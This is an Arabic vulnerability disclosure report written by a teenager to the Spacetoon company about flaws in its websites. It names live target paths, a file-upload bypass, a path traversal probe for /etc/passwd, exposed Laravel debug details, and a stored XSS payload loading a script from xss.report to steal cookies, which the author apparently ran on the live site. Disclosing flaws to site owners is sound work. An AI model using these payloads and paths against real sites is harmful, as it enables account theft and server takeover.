السلام عليكم ورحمة الله تعالى وبراكته

انا شاهين امجد عمري 16 عاماً

قد فكرت في هدية بسيطة جداً اهديها لكم على الذكريات والعبر الجميلة التي
تقدمونها لنا فعلاً حتى في عمري هذا فاني احن للمسلسلات الكراونيات والانمي
القديم مثل القناص في الجزء الاول وهكذا

الهدية هي انني قمت بعمل فصل شامل بكل مهاراتي لمواقعكم على الانترت كشكر
لكم ولاحمي مواقعكم من الهجمات التي يمكن ان يكون لها ضرر كبير عليكم

من الصغر كان هذا حلمي وقد حققته والحمد لله التالي هو تقرير شامل عن كل ما
فحصته وعن الثغرات الي وجدتها اتمنى ان اكون قد شرحت بطريقة تفهم لكم💗

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

اولاً: قد عثرت على ملفات قد ارشفت في موقع webarchive.org

هذه الملفات تحتوي كل منها على ملف php ضار يسمى بال c99shell قد قام احد
من الماضي بزرعه في الموقع الاساسي spacetoon.com وكان يتحكم بالموقع
وبقاعده البيانات ايضاً

عندما تحققت من المسار لم يكن موحوداً حالياً ولكن من الضروري التحقق من ان
المخترق لمن يقم بتحويله الا مسار اخر لضمان عدم حدوث اي اختراق اخر فان ال
shell المرفوع هذا يعطي المخترق تحكماً كاملاً بالموقع

هذه هي الروابط التي كانت تحتوي على الملفات الضارة في الماضي :

https://web.archive.org/web/20140623035444\*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399881053461.php
https://web.archive.org/web/20140623044436\*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399883407116.php
https://web.archive.org/web/20140623050300\*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399882361461.php
https://web.archive.org/web/20140623051834\*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399880976139.php
https://web.archive.org/web/20140623184338\*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399882442574.php
https://web.archive.org/web/20141220164849\*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399880756732.php

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

عند عمليه تسجيل الدخول باستخدام تقنيه Oauth يحدث خطا "400" في حالة
التسجيل ب google و facebook حاولت تحديد السبب ولكن لم اتكمن من ذلك واظن
انه سيكون اسهل بالتاكيد الموقع

\"ارجو ان تعلموني اذا اصلحتم الخطا لان ذلك سيصنع نوعاة حديدا من ملفات
تعريف الارتباط التي تسمى ب jwt والتي قد تحتوي على المثير من الثغرات
ايضاً وقد تطول للاستيلاء على حسابات المستخدمين\"

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

ثغره clickjacking

هي ثغره تحعل المستخدم يضغط على زرائر مخفيه وهو لا يعرف انه يضغط عليها في
حالة هذي الثغره فليست هناك خطورة كبيره لانها فقت يمكن ان تسمح للمستخدم
بجعل المستخدم يقوم بتسجيل الخروج من الموقع بغير علمه

الرابط المتاثر: https://blog.spacetoon.com

الكثير من مسارات هذا الرابط متاثره بنفس الثغره ولاكن ليس فيها خطر لانها
تنحصر على الصفحات التي يكون فيها زرائر حساسة على سبيل المثال زر لحذف
الحساب من الموقع

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

ثغره file uploud

هي نفس الثغره التي اخبرتكم عنها في الاول تسمح للمستخدم برفع ملفات ضاره

الطريقة: في: https://blog.spacetoon.com/usercp/artical/add

اكتب ما تريد وفي خانه اختيار الصور ستلاحظ انه يمكنك رفع اي ملف مثلا:
.html .php

والا اخره. وهكذا يمكن للمخترق ان يرفع ملف ضاره مثل c99shell ويتحكم
بالموقع كاملاً وفعلاً انها ثغره خطرك جداً

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

ثغره تسجيل الخروج:

الرابط: https://blog.spacetoon.com/logout

سيقوم بتسجيل خروج المستخدم على الفور يمكن ان يقوم المهاجم بعمل نوع من
التشفير له ويرسله للمستخدمين بحيث لا يعرفون انه لتسجيل الخروج وقد يقوم
بارساله في محموعه او قناك وسيسبب ضرراً اكبر

نصائح: اضف زراً عن الضغط على رابط تسجيل الخروج لتجعل المستخدم \"يؤكد\"
انه يريد ذلك

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

خطا استعاده الحساب: عن كحاوله استعاده password لحساب ما العملية تتوقف
بدون سبب ولا تعمل او بسبب ولكنني لم استطع معرفته

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

رابط عائلة مشيع لا يحتوي على اي نوع من جدران الحماية هذا الشي قد يقوم
بتبيب اضرار كثيره مثل ان تتم فيه هجمة ddos والتي تقوم بغلق الموقع وتعطيل
الخادم

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

ثغره xss - cross site scripting هي ثغره تسمح للمستخدم بحقن اكواد
javascript و html قد تقول انهو شي عادي وليس بالضار ولكن ساريك ماهو ضرره
الان: لانقل انني قمت بمعل كود \<script\>alert("You are
hacked")\</script\>

ستظهر كلمه You are hacked للمستخدم ومن الطبيعي ان يخاف

ولكن لازال تاثيراً بسيطاً ساريك ماهو المخيف الان:

هناك تقنية لعمل كود في الjavascript لن يظهر اي شي للمستخدم من هذا الكود
ولكن ما سيحصل هو انه سيقوم بتشيغله عند متصفح المستخدم الضحية ويقوم بسرقه
ملفات تعريف الارتباط الخاصه به cookies ما يعني ان المخترق يمكنه ان
يستولي على حسابات كللل شخص يفعل عنده الكود

هنا طريقه انتاج الثغره:

في: https://blog.spacetoon.com/usercp/artical/add

قم بكتابه ما تريد ولكن: هناك ادوات تعطرض الrequest لاسطيع التعديب فيه

لاحظت ان ما اكتبه يكون هكذا في الطلب \<p\>test\</p\> ما يعني انه في html
لذا قمت باضافه الكود الضار الذي يستولي على خسابات المستخدمين والذي هو :
\<script src=https://xss.report/c/shaheen101sec\> وقمت باكمال الrequest
وعندما كنت في المقالة حتى وفي في وضع الانتظار للقبول قد فعل الكود الضار
واستطعت الحصول على ملفات تعريف الارتباط الخاصه بحسابي

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

ثغره في نظام laravel:

هناك ثغره تسمى ب path travilsal تسمح للمهاجم بالكشف عن ملفات حساسه داخل
الخادم ولكن عند اختبارها من هذا الرابط:
https://conan27.spacetoon.com/public/admin/voyager-assets?path=../..etc/passwdقد
رصدها نظام laravel ولم استطتع من استغلالها ولكن حين رصدها laravel قد قام
مهما بالكشف عن مسارات لا يمطرض على شخص ان يعرفها

وهذه هي : #2
/home/conan27/public_html/vendor/tcg/voyager/src/Http/Controllers/VoyagerController.php(91):
League\\Flysystem\\WhitespacePathNormalizer-&gt;normalizePath(&#039;../etc/passwd&#039;)
#3
/home/conan27/public_html/vendor/laravel/framework/src/Illuminate/Routing/Controller.php(54):
TCG\\Voyager\\Http\\Controllers\\VoyagerController-&gt;assets(Object(Illuminate\\Http\\Request))
#4
/home/conan27/public_html/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(43):
Illuminate\\Routing\\Controller-&gt;callAction(&#039;assets&#039;,
Array) #5
/home/conan27/public_html/vendor/laravel/framework/src/Illuminate/Routing/Route.php(259):
Illuminate\\Routing\\ControllerDispatcher-&gt;dispatch(Object(Illuminate\\Routing\\Route),
Object(TCG\\Voyager\\Http\\Controllers\\VoyagerController),
&#039;assets&#039;) #6
/home/conan27/public_html/vendor/laravel/framework/src/Illuminate/Routing/Route.php(205):
Illuminate\\Routing\\Route-&gt;runController() #7
/home/conan27/public_html/vendor/laravel/framework/src/Illuminate/Routing/Router.php(798):
Illuminate\\Routing\\Route-&gt;run() #8
/home/conan27/public_html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(141):
Illuminate\\Routing\\Router-&gt;Illuminate\\Routing\\{closure}(Object(Illuminate\\Http\\Request))

وايضاً حين تدخل فيه قد يقوم بالكشف عن اوامر mysql

وكما قلت فانه يظهر ايضاً اكواد php وهي المسؤلك عن النظام الخلفيه للموقع
والمظام backend

على سبيل المثال:

\<?php

declare(strict_types=1);

namespace League\\Flysystem;

use RuntimeException;

class PathTraversalDetected extends RuntimeException implements
FilesystemException

{

private string \$path;

public function path(): string

{

return \$this-\>path;

}

public static function forPath(string \$path): PathTraversalDetected

{

\$e = new PathTraversalDetected(\"Path traversal detected: {\$path}\");

\$e-\>path = \$path;

return \$e;

}

}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

وايضا من خلال خطاً lareval حصلت على هذه المعلومات:

Php Version 8.2.26

Laravel Version 9.52.16

Laravel Locale en

Laravel Config Cached false App Debug true App Env local

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

رابط تسجيل الدخول للوحه الادمن هذا مصاب بثغره تسمى brute force تسمخ
للمهاجم بتحربه العديل من كلمات المرور الكثيرة في وقت قصير لغلق هذه
الثغره:

وضع حد للمحاولات في كل خمس ثواني وبعدها احعل المستخدم ينتظر دقيقه مثلاً

\"https://conan27.spacetoon.com/admin/login\"

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

الاتي مجموعه من headers الامنيه التي تساعد في جعل الموقع اكثر امن واقل
عرضة للهجمات والتي ليست موحوده في عدد من مواقعكم:

\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://abtal.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://abtal.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://abtal.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://abtal.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://abtal.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://mail.spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://mail.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://mail.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://mail.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://mail.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://mail.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://mail.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://mail.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://mail.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://mail.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://mail.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://22.spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://22.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://22.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://22.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://22.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://22.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://22.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://22.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://22.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://22.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://22.spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://spacetoon.com \[http-missing-security-headers:clear-site-data\]
\[http\] \[info\] https://spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://2023.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://2023.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://2023.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://2023.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://2023.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://2023.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://2023.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://2023.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://2023.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://2023.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://2023.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://btscontest.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://btscontest.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://btscontest.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://btscontest.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://btscontest.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://conan27.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://conan27.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://conan27.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://conan27.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://conan27.spacetoon.com
\[http-missing-security-headers:cross-origin-opener-policy\] \[http\]
\[info\] https://moshayafamily.spacetoon.com
\[http-missing-security-headers:content-security-policy\] \[http\]
\[info\] https://moshayafamily.spacetoon.com
\[http-missing-security-headers:permissions-policy\] \[http\] \[info\]
https://moshayafamily.spacetoon.com
\[http-missing-security-headers:referrer-policy\] \[http\] \[info\]
https://moshayafamily.spacetoon.com
\[http-missing-security-headers:clear-site-data\] \[http\] \[info\]
https://moshayafamily.spacetoon.com
\[http-missing-security-headers:cross-origin-embedder-policy\] \[http\]
\[info\] https://moshayafamily.spacetoon.com
\[http-missing-security-headers:cross-origin-resource-policy\] \[http\]
\[info\] https://moshayafamily.spacetoon.com
\[http-missing-security-headers:strict-transport-security\] \[http\]
\[info\] https://moshayafamily.spacetoon.com
\[http-missing-security-headers:x-frame-options\] \[http\] \[info\]
https://moshayafamily.spacetoon.com
\[http-missing-security-headers:x-content-type-options\] \[http\]
\[info\] https://moshayafamily.spacetoon.com
\[http-missing-security-headers:x-permitted-cross-domain-policies\]
\[http\] \[info\] https://moshayafamily.spacetoon.com

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

22.spacetoon.com تقرير بسيط عن

broken web style : https://22.spacetoon.com/

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

https://22.spacetoon.com/ : mysql users enum vuln

اسمح هذه الثغره للمخترق بالحصول على اسماء المستدمين في قاعده البيانات
mysql مما يجعل له هدفاً واضحاً لاختراق كلمه مروره

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

1\. عدم استخدام خاصية Secure في الكوكيز. 2. تعدد الأخطاء في استخدام
JavaScript. 3. وجود ملفات XML-RPC في موقع WordPress.

\#### التحليل الأمني

\##### 1. عدم استخدام خاصية Secure في الكوكيز - \*\*الموقع:\*\*
spacetoon.com - \*\*الكوكيز:\*\*
\[\"spacetoon_lXgt3lOiwVPZiQhp69esDxGX-j2P_py0\",
\"UyqEyEdwKtJV0_6C1IOH0a2elToeb-SG\"\] - \*\*التأثير:\*\* عدم استخدام
خاصية Secure في الكوكيز يعني أن البيانات غير محمية أثناء الانتقال بين
العميل والخادم، مما يجعلها عريضة للاستثمار. - \*\*الحل:\*\* يجب ضمان
استخدام خاصية Secure في جميع الكوكيز التي تحتوي على بيانات حساسة.

\- \*\*الموقع:\*\* conan27.spacetoon.com - \*\*الكوكيز:\*\*
\[\"XSRF-TOKEN\", \"laravel_session\"\] - \*\*التأثير:\*\* نفس التأثير
منذ عدم استخدام خاصية Secure في الكوكيز. - \*\*الحل:\*\* يجب ضمان
استخدام خاصية Secure في جميع الكوكيز التي تحتوي على بيانات حساسة.

\- \*\*الموقع:\*\* moshayafamily.spacetoon.com - \*\*الكوكيز:\*\*
\[\"XSRF-TOKEN\", \"moshayafamily_session\"\] - \*\*التأثير:\*\* نفس
التأثير منذ عدم استخدام خاصية Secure في الكوكيز. - \*\*الحل:\*\* يجب
ضمان استخدام خاصية Secure في جميع الكوكيز التي تحتوي على بيانات حساسة.

\##### 2. عدم استخدام خاصية HttpOnly في الكوكيز - \*\*الموقع:\*\*
conan27.spacetoon.com - \*\*الكوكيز:\*\* \[\"XSRF-TOKEN\"\] -
\*\*التأثير:\*\* عدم استخدام خاصية HttpOnly في الكوكيز يعني أن الكوكيز
يمكن للمستخدمين وصولها من خلال الجافاسكريبت، مما يجعلها عريضة
للاستثمار. - \*\*الحل:\*\* يجب ضمان استخدام خاصية HttpOnly في جميع
الكوكيز التي تحتوي على بيانات حساسة.

\##### 3. وجود ملفات XML-RPC في موقع WordPress - \*\*الموقع:\*\*
https://22.spacetoon.com/xmlrpc.php - \*\*الأخطاء:\*\*  -
\*\*wp-xmlrpc-pingback-detection\*\*  -
\*\*wordpress-xmlrpc-listmethods\*\*  - \*\*wp-license-file\*\*  -
\*\*wordpress-xmlrpc-file\*\* - \*\*التأثير:\*\* وجود ملفات XML-RPC
مكتشفة في موقع WordPress يعني أن الموقع يمكن أن يكون مكررًا بواسطة برامج
تجارب القوة أو برامج تجارب القوة الآلية. هذا يمكن أن يؤدي إلى استهلاك
المعدات وتوقف الخدمة. - \*\*الحل:\*\* يجب تعطيل الوظيفة XML-RPC إذا لم
تكن تستخدم، أو ضمان تشفير المعلومات المرسلة والمقبلة.

\#### الخاتمة يؤدي تجاوز الأخطاء الأمنية المذكورة في التقرير إلى عدم
الأمان للبيانات والمستخدمين، ويمكن أن يؤدي ذلك إلى استهلاك المعدات وتوقف
الخدمة. يجب على المسؤولين بالموقع اتخاذ إجراءات فورية لحل هذه الأخطاء
وضمان سلامة الموقع والمستخدمين.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

\#### وصف المشكلة تم الكشف عن طريقة وصول للموقع المحدد للتحقق من الصحة
لتطبيقات لارافل، ويُظهر أن هناك تمكين للتحقق من الصحة للموقعات
التالية: - \[لارافل-تحقق-في-الحالة\] \[http\] \[متوسط\]
https://moshayafamily.spacetoon.com/\_ignition/health-check -
\[لارافل-تحقق-في-الحالة\] \[http\] \[متوسط\]
https://conan27.spacetoon.com/\_ignition/health-check

\#### تفاصيل الاستجابة - \*\*محتوى الجسم:\*\* \`\`\`json {
\"can_execute_commands\": true } \`\`\`

\#### تأثير المشكلة - \*\*المخاطر:\*\* تتيح هذه الميزة للمستخدمين السيئة
الوصول إلى تحقق الصحة للموقعات، مما يمكن أن يؤدي إلى تحليل النظام وإيجاد
المعلومات الحساسة. - \*\*التهديدات:\*\* يمكن أن يستغل المتحفزون هذه
الميزة لتنفيذ أوامر مخطئة أو تنزيل ملفات مشفرة، مما يمكن أن يؤدي إلى
تعطل النظام أو تسرب البيانات.

\#### حل المشكلة 1. \*\*تعطيل تحقق الصحة:\*\*  - يجب على المسؤولين عن
النظام تعطيل تحقق الصحة للموقعات التي تستخدم لارافل. يمكن تنفيذ ذلك من
خلال تعديل إعدادات التطبيق أو استخدام أدوات التحكم في الوصول.

2\. \*\*حماية ضد المستخدمين السيئة:\*\*  - يجب تثبيت أدوات تحقق الصحة
والأمان لتحديد وتحكم الوصول إلى النظام. يمكن استخدام أدوات مثل Fail2Ban
لتحديد وحظر العناوين التي تستخدم أوامر مخطئة.

3\. \*\*تحديثات الأمان:\*\*  - يجب على المسؤولين عن النظام دائماً تحديث
تطبيقات لارافل والبنية التحتية إلى أحدث الإصدارات لتحديد الأخطاء
والضعفات الأمنية المعروفة.

4\. \*\*مراقبة النظام:\*\*  - يجب تثبيت أنظمة مراقبة وتسجيل الأنشطة
لمراقبة النشاطات غير المعتادة والتحدث بسرعة مع أي تشكيلات أمنية.

\#### ملاحظات نهائية يجب على المسؤولين عن النظام الاستثمار في أدوات
واستراتيجيات أمنية قوية لحماية بياناتهم وتجنب المخاطر الأمنية. يمكن أن
تساعد هذه الإجراءات في تقليل المخاطر وتحسين درجة الأمان للنظام.
